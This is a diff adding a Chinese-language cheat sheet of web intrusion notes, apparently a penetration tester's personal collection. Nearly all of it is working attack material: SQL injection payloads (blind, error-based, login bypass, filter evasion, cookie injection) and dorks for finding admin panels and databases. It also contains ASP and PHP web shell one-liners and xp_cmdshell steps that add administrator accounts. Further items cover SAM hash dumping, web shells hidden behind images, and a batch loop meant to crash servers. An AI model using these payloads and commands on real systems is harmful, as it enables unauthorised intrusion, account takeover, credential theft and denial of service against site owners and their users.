@@ -1,0 +1,615 @@
+shtml看源代码
+流光扫服务器
+在地址添加
+info.php 
+phpinfo.php  
+test.php 
+robot.txt
+robots.txt
+
+
+延迟注入来判断 （当然or语句应该也是可以的，只是一点思路）
+
+比如：
+
+word=%d5%27 and 1=1%23
+word=%d5%27 and 1=2%23
+是判断不出是否存在注入的，因为都没查询到，这时我们可以构造：
+
+word=%d5%27 and id=benchmark(1800000,md5(144111))%23
+因为id这个字段一般都是存在的，将144111算md5值算1800000次，必然需要一定的时间，于是就产生了延迟，如果浏览器假死的话就存在注入漏洞。
+
+
+
+'or1=1/*
+
+2012-06-11 10:36 update和insert报错SQL注射利用笔记 以MySQL为例,有时候运气好的话update类型的SQL注射可以直接将我们需要的内容更新到我们可见的字段里.这样比较方便,比如这篇文章提到的dedecms的注射爆管理员密码的漏洞,期间我还傻傻的写了个小程序盲注来着,后来发现没必要,可以直接把密码字段的内容放到用户名里显示出来.有时候运气不好,那个字段内容显示不出来的话,恰巧能输出mysql错误信息,也可以利用报错注射.
+
+ 
+
+update 类型爆错注入
+
+ 
+
+update web_ids set host=' www.2cto.com ' where id =1 aNd (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (version())),1,62)))a from information_schema.tables group by a)b);
+
+ERROR 1062 (23000): Duplicate entry ’15.1.41-3ubuntu12.10‘ for key ‘group_key’
+
+ 
+
+insert 类型报错盲注
+
+ 
+
+有的比较猥琐的网站会记录访问者的ip地址,浏览器信息等等到数据库里,
+
+有些_SERVER变量不受魔术引号控制,或者我们可以覆盖_SERVER变量的话,这类漏洞就可能发生.
+
+但是一般情况下数据只会才后台显示,不会在前台显示出来
+
+这类漏洞运气好的话,也可以报错注射,运气不好的话就延时盲注猜解吧.
+
+ 
+
+insert into web_ids(host) values((select (1) from mysql.user where 1=1 aNd (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (version())),1,62)))a from information_schema.tables group by a)b)));
+
+ERROR 1062 (23000): Duplicate entry ’15.1.41-3ubuntu12.10‘ for key ‘group_key’
+
+ 
+
+找到 php统计配置信息
+
+读取
+/etc/httpd/conf/httpd.conf
+
+siteadmin
+sys_admin
+ad_admin
+webadmin
+
+Data.mdb
+#Data.mdb
+Data00.mdb
+
+发现还要填写后台目录。猜不到。所以拿起工具开扫
+
+
+/www.aaa.com:8080/
+/test.aaa.com/
+
+
+admin
+123456
+admin888
+198625
+86779533	
+abc123
+5201314
+1a2s3d4f5g
+
+
+猜管理员后台小技巧:
+admin/left.asp 
+admin/main.asp
+admin/top.asp
+admin/admin.asp 
+会现出菜单导航,然后迅雷下载全部链接
+
+-----------------------------------------------------------
+allinurl:data/base.mdb
+
+site:www.网站.com  intext:上传
+
+index of /admin
+"mdb" site:xxxx.com 
+"login"  site:xxxx.com 
+site:xxxx.com filetype:doc
+site:xxxx.com intext:管理
+site:xxxx.com inurl:login
+site:xxxx.com intitle:管理
+site:www.****.com intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|manage|admin|login|system
+site:www.*****.com inurl:login|admin|manage|manager|admin_login|login_admin|system
+site:www.***.com intitle:管理|后台|登陆|
+site:www.****.com intext:验证码
+
+cache:hnu.edu.cn
+info:hnu.edu.cn         /*搜基本信息
+site:xxxx.com inurl:ewebeditor
+site:xxxx To Parent Directory
+          转到父目录
+          inurl:/inc+conn.asp
+site:xxxx To Parent Directory inurl:/Inetpub
+site:xxxx To Parent Directory inurl:/tcp
+intext:To Parent Directory+intext:conn.asp site:xxxx.com
+
+site:xxxx.com intext:*@xxxx.com //得到N个邮件地址，还有邮箱的主人的名字什么的
+site:xxxx.com intext:电话 //N个电话
+
+gif site:xxxx.com
+
+site:www.straitsquay.com log in
+
+filetype:xls inurl:xxx  username password
+
+inurl:phpmyadmin/main.php intitle:phpmyadmin
+
+filetype:inc inurl:config.inc host
+
+filetype:sql cdb_members inurl:froumdata
+
+filetype:txt inurl:"新建文本文档.txt" 密码
+
+inurl:phpinfo intitle:"phpinfo()"
+
+filetype:log inurl:log mdb
+
+
+http://（这里输入任何关键字）.jpg.to
+
+
+IP:xxxx 管理
+IP:xxx  错误
+IP:xxxx 注册
+IP:xxxx 上传
+IP:xxxx 登陆
+
+
+
+ 
+老外的思路是将关键词
+ 唯一的问题是：我需要一个更大的解析度图像上的大投影机。由于这是做谷歌图片搜索... 任何一个机会：
+ http://keyword.jpg.to/large
+ http://keyword.jpg.to/medium
+ [加]
+ http://keyword.jpg.to/photo
+ http://keyword.jpg.to/clipart
+ [加]
+ http://keyword.jpg.to/red
+ http://keyword.jpg.to/green
+ http://keyword.jpg.to/white 
+
+
+如我们稍微的改变下思路例如这样呢
+ http://ewebeditor.mdb.to/admin
+ 果然会是怎么样呢 嘻嘻。。。
+
+Google上搜索他的ID  个人简介，个性签名
+
+博客，QQ空间等  ，因为社会工程学本来就是针对人类心理的漏洞来实施入侵
+
+12、google搜索的艺术
+搜索关键字：“未闭合的引号”或“ADODB.Field.error”或“Either BOF or EOF in True”
+或“字符串的语法错误”可以找到很多sql注入漏洞。
+
+
+bing.com ip:xxx.xx.xx.xx 也不错.有很大程度上列出一些同服站.
+
+baidu的filetype:all xxxx  // 注意带个all.
+
+
+之前发现很多php apache这些都列目录。如果有apache存在一定不要忘了这一点。
+
+http://www.google.com/remove.html
+
+love.asp;gif
+
+asp aspx万能密码
+
+'xor 
+'or'='or'
+'or''='
+
+"or "a"="a
+ ')or('a'='a 
+or 1=1--
+'or 1=1--
+a'or' 1=1--
+"or 1=1--
+'or'a'='a
+"or"="a'='a
+
+
+1 or '1'='1'=1
+1 or '1'='1' or 1=1
+'OR 1=1%00 
+"or 1=1%00
+'xor 
+用户名: ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）密码: 1
+admin' or 'a'='a 密码随便
+
+
+类似的应该还有admin"#和admin" --,楼主可以试验下
+密码随便填
+
+
+PHP万能密码
+
+'or 1=1/*
+
+1’or’1’=’1’or’1’=’1 
+
+
+admin
+pass'or'1'='1
+
+'admin'/*hack
+hack*/
+admin/*hack
+hack*/
+
+admin’/*hacking by Juliet！
+japanese all are dogs*/’
+
+User: something 
+Pass: ' OR '1'='1
+
+admin'or'1'='1
+'or'1'='1
+
+jsp 万能密码
+
+1'or'1'='1
+'or'='or'
+admin' OR 1=1/*
+-----------------------------------------------------------------------------------
+全新的注入点检测方法
+
+
+ and 1=1 //过滤
+ aNd 1=1
+-1  不正常
+-0  正常
+ and 2<3
+ and 2>3
+or 1<2 很明显是正确的,所以应该与原页面不同
+or 1>2 很明显是错误的,所以应该与原页面相同
+
+ order by 7 不行的话
+orderby7  因为mssql可以不用空格
+and user > 0    不行试
+and user not like 0
+/**/and/*&id=*/user/**/>0
++UnIoN/**/SeLecT/**/1,2,3--
++un/**/ion+se/**/lect+1,2,3--
++UNunionION+SEselectLECT+1,2,3--
++uni%0bon+se%0blect+1,2,3--
+
+ a'
+a' and user>0--
+1%' and 1=1 and '%'='
+
+
+检测注入点新方法运算符法,在过滤了and or cookies时用比有效果:
+-1%23
+> 
+<
+1'+or+'1'='1
+id=8%bf
+
+全新注入点检测试法:
+在URL地址后面加上-1，URL变成：http://gzkb.goomoo.cn/news.asp?id=123-1，如果返回的页面和前面不同，是另一则新闻，则表示有注入漏洞，是数字型的注入漏洞;在 URL地址后面加上 -0，URL变成 http://gzkb.goomoo.cn/news.asp?id=123-0，返回的页面和前面的页面相同，加上-1，返回错误页面，则也表示存在注入漏洞，是数字型的。
+
+在URL的地址后面加上'%2B'，URL地址变为：http://gzkb.goomoo.cn/news.asp?id=123'%2B'，返回的页面和1同;加上'2%2B'asdf，URL地址变为：http://gzkb.goomoo.cn/news.asp?id=123'%2Basdf，返回的页面和1不同，或者说未发现该条记录，或者错误，则表示存在注入点，是文本型的。
+
+搜索型注入判断方法:
+北京%' and '1'='1' and '%'='
+北京%' and '1'='2' and '%'='
+
+
+COOKIES注入:
+
+javascript:alert(document.cookie="id="+escape("51 and 1=1"));
+后台注入选择Load from
+
+' or  ascii(substring((select pass from admin limit 0,1),1,1)) >97 #
+
+and name not in ('user'))>0--
+
+第一个字母
+
+太长的话抓包
+
+UNION注入时注意的技巧，可以用UNLL来代替
+
+and 2<=3
+and 1 is null
+and 1 is not null
+id=1+u/**/nio/**/n+se/**/lect+1&id=2,3&id=4 
+
+
+%df%27 or 1=1/*
+%df%27 or 1=2/*
+
+数字型的
+news.asp?id=123-0，返回的页面和前面的页面相同，加上-1，返回错误页面，则也表示存在注入漏洞，
+
+
+是文本型
+news.asp?id=123'%2B'，返回的页面和1同
+news.asp?id=123'%2Basdf，返回的页面和1不同，或者说未发现该条记录，或者错误，则表示存在注入点
+
+http://127.0.0.1/jmCook.asp?jmdcw=610
+
+http://www.xxx.com/news.asp?id=37
+去掉37 将不显示新闻
+地址栏输入
+asp?id=javascript:alert(document.cookie="id="+escape("137 and 1=1"));  正常
+asp?id=javascript:alert(document.cookie="id="+escape("137 and 1=2"));  不正常
+说明存在cookie注入
+猜表名  
+asp?id=javascript:alert(document.cookie="id="+escape("137 and (select count(*) from admin)
+>0"));
+正常则说明存在admin这个表名 不然就要换其他的  manage manager master system user  user boss
+...
+asp?id=javascript:alert(document.cookie="id="+escape("137 order by 10"));
+先大的数值 不正常  直到数值越来越小 正常了   字段数就是多长
+接下来就是爆管理员 帐号 密码
+asp?id=javascript:alert(document.cookie="id="+escape("137 and 1=2 union select 1，2，3，5，6
+，7，8，9，10 from admin"));
+如果报错 4 和 7  
+4 该为 username     不正常换其他字段名 
+7 改为 password     不正常换其他字段名 
+获得帐号密码
+
+
+
+知道表名，字段，使用SQL语句在ACCESS数据库中加个用户名及密码语句如下:
+Insert into admin(user,pwd) values('test','test')
+
+
+SQL注入直接修改管理员密码的MD5值
+得到密码为:a4716077c2ba075c
+我们加密的字符：e8dc763194f29433
+http://注入网址;update admin set password='新MD5密码' where password='旧MD5密码'
+;update shop_admin set password=’e8dc763194f29433’ where password=’a4716077c2ba075c’–
+
+----------------------------------------------------------------------------------------
+手工实现差异备份的步骤发布
+
+
+create table kuge (a varchar(50))                               创建一个表
+insert into kuge (a) values ('<%execute request("a")%>')        插入一句话
+select * into [a] in 'f:/web/kuge.asp' 'excel 4.0;' from kuge   导出
+drop table kuge                                                 删除这个表)
+
+
+1、恢复当前库
+;alter database 当前库 set RECOVERY FULL--
+
+2、建表cmd
+;create table cmd (a image)--
+
+3、备份当前库到D:\cmd1
+;backup log 当前库 to disk = 'D:\cmd1' with init--
+
+4、插入一句话代码到创建的表cmd
+;insert into cmd (a) values ('<%%25**ecute(request("a"))%%25>')-- 
+
+5、备份一句话代码到站点根目录
+;backup log 当前库 to disk = 'D:\www_web\oct.asp'--
+
+6、完成
+;drop table 创建的表--
+
+
+
+
+1、恢复当前库
+;alter database 当前库 set RECOVERY FULL--
+
+2、创建表cmd
+;create table cmd (a image)--
+
+3、备份当前库到D:\cmd1
+;backup log 当前库 to disk = 'D:\cmd1' with init--
+
+4、插入一句话代码到创建的表cmd
+;insert into cmd (a) values ('<%%25**ecute(request("a"))%%25>')-- 
+
+5、备份一句话代码到站点根目录
+;backup log 当前库 to disk = 'D:\www_web\oct.asp'--
+
+6、完成
+;drop table 创建的表--
+
+sa权限创建管理员用户
+
+1、判断是否有注入;and 1=1 ;and 1=2 
+;and user_name()='dbo' 判断当前系统的连接用户是不是sa
+
+2、添加系统的管理员
+;exec master.dbo.xp_cmdshell 'net user wk wk90/add';-- 
+;exec master.dbo.xp_cmdshell 'net localgroup administrators wk /add';--
+
+-----------------------------------------------------------
+
+
+得到web路径
+exec master..xp_cmdshell ’copy C:\Windows\system32\inetsrv\MetaBase.xml C:\Windows\Help\iisHelp\common\404b.htm’--
+在 MetaBase.xml存着IIS的很多信息。执行上面的语句之后，你再访问一下网站一个不存在的文件或目录，显示的就shiMetaBase.xml 的内容了
+
+执行命令
+     
+     注入点后面执行   ;exec master..xp_cmdshell 'ver >C:\Windows\Help\iisHelp\common\404b.htm'--
+
+1.注入点后执行;exec master.dbo.xp_cmdshell 'echo ^<script language=VBScript runat=server^>execute request^("90"^)^</script^> >c:\mu.asp';--
+
+2.CMD下执行 echo ^<%execute^(request^("l"^)^)%^> >c:\mu.asp 
+
+
+导2000  2003的hash
+
+reg save hklm\sam sam.hive
+reg save hklm\sam syste.hive
+
+exex xp_cmdshell "whoami"
+exex xp_cmdshell "net user keio keio.asd /add"
+
+ewebeditor.mdb
+不能下载时可以考虑跨库查询（必需猜到网站物理路径）
+注入点若为
+http://site.com/show.asp?id=7
+物理路径wei：D:/site1/wwwoot/show.asp
+ewebeditor数据库路径
+http://site.com/editor/db/ewebeditor.mdb
+物理路径：D:/site1/wwwoot/editor/db/ewebeditor.mdb
+跨库查询
+http://site.com/show.asp?id=7 union select 1，sys_username,3,4,sys_userpass,6,7,8 from ewebeditor_system in "D:/site1/wwwoot/editor/db/ewebeditor.mdb"
+
+利用stm读配置文件
+<!--#include file="../../conn.asp"-->  跳两级
+
+下载突破  编码全部修改成url
+
+
+cacls d:\website\index.asp /t /e /c /g users:f
+
+cacls d:\website /g everyone /e /t授与完全控制
+cacls d:\website /r everyone /e /t取消完全控制
+
+SA加系统用户
+exec master.dbo.xp_cmdshell 'net user admin admin /add'
+exec master.dbo.xp_cmdshell 'net localgroup administrators admin /add'
+
+
+恢复扩散
+dbcc addextendedproc ("sp_OACreate","odsole70.dll")
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
+
+如果恢复不了的解释:
+因为管理员是直接删除dll文件，而没删除存储过程，你这样恢复肯定是提示存储过程已存在了。你要先删除存储过程，use master
+EXEC sp_dropextendedproc 'xp_cmdshell'
+
+然后上传xplog70.dll到某个目录，例如C盘根目录，然后执行
+use master dbcc addextendedproc('xp_cmdshell','c:\xplog70.dll')
+就可以使用cmdshell存储过程执行系统指令了。
+
+
+copy c:\system32\config\sam f:\usr\cwf93335\sam 就这样sam就复制到网站根目录了，那么就可以下载了..
+
+
+请登录后再上传解决
+
+利用菜刀修改cookie 可以试试 如果限制上次看能不能双文件上传突破
+
+
+Admin_UploadFile.asp
+Admin_Decode.asp
+Admin_Private.asp
+Admin_Style.asp
+
+
+在脚本入侵过程中要经常常试用%00来确认下参数是否有问题
+
+有时候我们入侵的时候，在webshell没有办法列举网站的目录包括dir也不行的时候，这个时候可以尝试用DOS命令SUBST转移目录
+例如:
+subst k: d:\www\ 用d盘www目录替代k盘
+subst k: /d  解除K盘代替
+
+
+
+23、缺少xp_cmdshell时
+尝试恢复EXEC sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll'
+假如恢复不成功,可以尝试直接加用户(针对开3389的)
+declare @o int
+exec sp_oacreate 'wscript.shell',@o out
+exec sp_oamethod @o,'run',NULL,'cmd.exe /c net user ating ating /add' 再提到管理员
+
+
+
+
+33、让服务器重启
+写个bat死循环:
+@echo off
+:loop1
+cls
+start cmd.exe
+goto loop1
+保存成bat guset权限就可以运行 运行后很快服务器就会死机 管理员自然会去重启
+
+
+
+
+35、有时候提不了权限的话，试试这个命令，在命令行里输入：
+start http://www.hack520.org/muma.htm然后点执行。（muma.htm是你上传好的漏洞网页）
+输入：netstat -an | find "28876" 看看是否成功绑定，如果有就telnet上去，就有了system权限，当然也可以nc连接，本地执行命令。
+
+
+
+56、在地址栏或按Ctrl+O，输入：
+javascript:s=document.documentElement.outerHTML;document.write('<body></body>');document.body.innerText=s;
+
+源代码就出来了。不论加密如何复杂，最终都要还原成浏览器可以解析的html代码，而documentElement.outerHTML正是最终的结果。
+
+
+echo ^<^?php eval^($_POST[cmd])?^>>E：\路径\22.php
+
+echo <?php `$_REQUEST[id]`;?>   
+22.php
+22.php?id=cmd
+
+
+模仿管理-编辑当前模版-在模版中插入php一句话。在保存的同时抓包，把抓到的包_left_html改成cajjian.php。利用nc进行上传
+
+hosts
+C:\WINDOWS\system32\drivers\etc\hosts
+
+两个常用的Hash在线破解网站
+http://cracker.offensive-security.com/index.php
+http://www.objectif-securite.ch/en/products.php
+
+.MySQL盲注中提升猜解效率的新方法  2011-05-03 19:45:11|  分类： 注入渗透 |  标签：mysql  mid  table_name  find_in_set  char   |字号大中小 订阅 .
+
+此方法比二分法、位推法等更好一点，
+查询请求示例：
+AND (SELECT @a:=MID(BIN(FIND_IN_SET(MID(table_name,1,1), ‘a,b,c,d,e,f
+,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,0,1,2,3,4,5,6,7,8,9,_,!,@,#,
+$,%,^,&,*,(,),-,+,=,\,,.,”,\’,~,`,\\,|,{,},[,],:,;, ,’)),1,1) FROM in
+formation_schema.tables LIMIT 1)=@a AND IF(@a!=”,@a,SLEEP(5));
+
+
+1为正，0则为假，SLEEP(5)延时为空（表示为末位）。
+原理可以参考原文，方法优点在于请求次数更少，不足在于不能确定大小写（MySQL字符串比较不区分)、SLEEP()用时过长等 等 。
+很多可以优化的地方，如猜用户名只需要a-z0-9就一般够用了，密码这种区分大小写的得用CHAR()才行，像这样FIND_IN_SET(CHAR(MID(table_name,1,1)), ’97,98,99′)
+，SLEEP()太费时间，可以考虑利用runtime报错(如1/0,escape?ex…)，还有第一位根本不用猜解，肯定恒为1等 等 ，要想利用这技术这些都得考虑进去。
+
+
+
+MSSQL延时注入语句。
+2011年11月1日 willson   88 views 发表评论 阅读评论 
+使用if + waitfor
+
+IF(ascii(SUBSTRING('name',1,1))>0)waitfor delay'0:00:3'
+
+将一句话保存为 XX.jpg 上传后    
+
+在上传一个x.asp内容为 <!–#include file="./xxxxxx.jpg"--> //也就是前面上传图片马儿的路径
+
+也就是所谓的图片调用  
+
+php类型
+
+将一句话保存为 XX.html   
+
+
+在上传一个x.php 内容为<?php include "./2.htm";?>  /*前面html的路径
+
+
+
+一句话代码，密码#
+ 1.<%  
+2.  
+3.if request(chr(35))<>"" then  
+4.response.clear  
+5.ExecuteGlobal request(chr(35))  
+6.response.end  
+7.end if  
+8.  
+9.%>  
+ 
+上传一个asp调用此jpg图片
+ 
+
+代码
+ 1.<!--#include file="图片路径" -->
+
